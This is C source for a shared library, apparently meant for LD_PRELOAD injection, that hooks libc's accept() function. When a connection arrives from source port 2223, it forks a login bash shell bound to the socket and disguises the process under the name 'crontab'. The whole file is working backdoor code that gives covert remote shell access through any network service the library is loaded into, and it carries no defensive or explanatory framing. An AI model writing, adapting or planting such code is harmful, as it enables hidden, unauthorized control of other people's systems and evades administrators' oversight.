#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <dlfcn.h>

//#define LIBC_PATH "/lib/x86_64-linux-gnu/libc-2.19.so"
#include "defines.h"

#define PORT 2223
#define SHELL_NAME "crontab"
//#define CLOSE_SOCK
#define WELCOME_MESSAGE "/bin/bash\n"

void *libc;

void __attribute ((constructor)) init(void) {
  libc=dlopen(LIBC_PATH, RTLD_LAZY);
}

static int (*old_accept)(int sockfd, struct sockaddr *addr, socklen_t *addrlen);

void shell(int sockfd) {
  write(sockfd, WELCOME_MESSAGE, strlen(WELCOME_MESSAGE));
  int pid = fork();
  if (pid == 0) {
    dup2 (sockfd, STDIN_FILENO);
    dup2 (sockfd, STDOUT_FILENO);
    dup2 (sockfd, STDERR_FILENO);
    execl ("/bin/bash", SHELL_NAME, "-l", (char *) 0);
  }
  sleep(2);
  /* we need to close the socket so that it can be reused 
   with netcat, this causes netcat to continue running in the background
  but still kills interactivity*/
#ifdef CLOSE_SOCK
  close(sockfd);
#endif
  return;
}

int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen) {
  if (!libc) {
    libc=dlopen(LIBC_PATH, RTLD_LAZY);
  }

  if(!old_accept){
    old_accept = dlsym(libc,"accept");
  }

  int fd = old_accept(sockfd, addr, addrlen);
  int portno = ntohs(((struct sockaddr_in*)addr)->sin_port);
  if (portno == PORT) {
    shell(fd); // will fork
    // We need to return a valid socket
    // this appears to work bug-free
#ifdef CLOSE_SOCK
    return accept(sockfd, addr, addrlen);
#endif
  }
  return fd;
}
